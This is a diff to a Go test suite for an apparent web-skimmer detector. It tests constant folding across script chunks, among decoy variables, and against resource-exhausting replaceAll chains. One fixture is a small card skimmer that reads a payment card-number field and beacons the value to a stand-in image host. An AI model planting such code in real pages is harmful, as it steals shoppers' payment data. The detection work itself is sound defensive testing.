@@ -25,7 +25,7 @@ func TestFoldingHostileScripts(t *testing.T) {
 		"replace all empty": x4 + strings.Repeat("c.replaceAll('',c);", 1<<20/19),
 		"replace chain":     x4 + "c" + strings.Repeat(".replaceAll('',c)", 1<<20/17),
 	} {
-		_, tokens, steps := foldWork([]byte(src), map[string]string{})
+		_, tokens, steps := foldWork([]byte(src), newFoldConstants())
 		if steps > 8*tokens || steps >= maxFoldSteps {
 			t.Errorf("%s: %d terms for %d tokens", name, steps, tokens)
 		}
@@ -44,19 +44,30 @@ func TestSkimmerSearchStopsWithTheRun(t *testing.T) {
 	}
 }
 
-// Constants are kept from one piece of a script to the next, and thousands of decoys before the
-// real one do not push it out.
+// Constants are kept from one piece of a script to the next, and thousands of decoys set before
+// or after the real one, never used, do not push it out of the piece that uses it.
 func TestFoldedConstantsAcrossPiecesAndDecoys(t *testing.T) {
+	use := "var f=document.querySelector('[name=\"'+'payment[c'+a+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value"
+	chunked := func(src []byte) []string {
+		var fam skimmerFamilies
+		for off := 0; off < len(src); off += skimmerChunk {
+			fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
+		}
+		return fam.verdict()
+	}
+	if chunked([]byte("var a='c_n';/*"+strings.Repeat("x", 2*skimmerChunk)+"*/"+use)) == nil {
+		t.Error("a constant set two pieces before its use was lost")
+	}
 	var decoys strings.Builder
-	for i := range maxFoldConstants + 100 {
+	for i := range 2 * maxFoldConstants {
 		fmt.Fprintf(&decoys, "var d%d='x';", i)
 	}
-	src := []byte(decoys.String() + "var a='c_n';/*" + strings.Repeat("x", 2*skimmerChunk) + "*/var f=document.querySelector('[name=\"'+'payment[c'+a+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value")
-	var fam skimmerFamilies
-	for off := 0; off < len(src); off += skimmerChunk {
-		fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
-	}
-	if fam.verdict() == nil {
-		t.Error("a constant set two pieces before its use was lost")
+	for name, src := range map[string]string{
+		"decoys before": decoys.String() + "var a='c_n';" + use,
+		"decoys after":  "var a='c_n';" + decoys.String() + use,
+	} {
+		if chunked([]byte(src)) == nil {
+			t.Errorf("%s: the constant was pushed out", name)
+		}
 	}
 }
